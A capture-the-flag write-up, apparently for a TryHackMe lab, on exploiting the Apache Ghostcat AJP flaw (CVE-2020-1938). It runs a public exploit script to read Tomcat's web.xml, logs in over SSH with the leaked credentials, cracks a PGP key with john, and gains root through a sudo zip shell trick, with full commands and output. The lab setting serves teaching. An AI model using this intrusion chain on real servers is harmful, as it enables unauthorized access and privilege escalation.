
Title: Apache Ghostcat Vulnerability [CVE-2020-1938]

Description: Apache Ghostcat is a new vulnerability with high risk severity discovered by a security researcher in AJP(Apache Jserv Protocol). AJP is an optimized version of the HTTP protocol in binary form and used in scenarios that require clustering or reverse proxies. By default, it is enabled on port 8009. By exploiting this vulnerability an attacker can read any web application files including source code. If the application allows file upload then an attacker can upload any files to the server including malicious Java Server Pages (JSP) and can gain system access.

Check for the /conf/server.xml

If port 8009 using AJP is open we can use an [exploit](https://github.com/00theway/Ghostcat-CNVD-2020-10487).

```
	export IP=10.10.42.24
```

Nmap Scan resuts


```(nmap scan)
	
	nmap -sS -sV $IP

	PORT     STATE SERVICE    VERSION
	22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	53/tcp   open  tcpwrapped
	8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
	8080/tcp open  http       Apache Tomcat 9.0.30
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Lets check if the /WEB-INF/web.xml file is readable.

wget "https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py"


```(ajpShooter)

python3 ajpShooter.py http://$IP:8080 8009 /WEB-INF/web.xml read
       _    _         __ _                 _            
      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
         |__/|_|                                        
                                                00theway,just for test
    

[<] 200 200
[<] Accept-Ranges: bytes
[<] ETag: W/"1261-1583902632000"
[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
[<] Content-Type: application/xml
[<] Content-Length: 1261

<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

we are able to get the ssh credentials.

```
skyfuck:8730281lkjlkjdqlksalks
```
Lets get the user flag

```
ssh skyfuck@$IP 
cd ..
ls
cd merlin
cat user.txt
```
# Task 1: (User Flag)

```
THM{GhostCat_1s_so_cr4sy}
```

We also get pgp file that needs to be decryted to get other users credentials.

Lets use scp to copy the files to ur host system.

```
cd
scp skyfuck@$IP:/home/skyfuck/* .
gpg2john tryhackme.asc > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```(cracking)
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2020-07-15 23:09) 1.694g/s 1816p/s 1816c/s 1816C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Now we decrypt the pgp file using the credentials.

```
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```
```
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```
```
su merlin
sudo -l
```

The user merlin has sudo access on zip. So, lets use this usr/bin/zip privilege exclation. 
To perform privilege escalation we need to create any file and zip it. 

ZIP Exploitation(https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/)


touch 1337.txt
sudo zip 1.zip 1337.txt -T --unzip-command="sh -c /bin/bash"

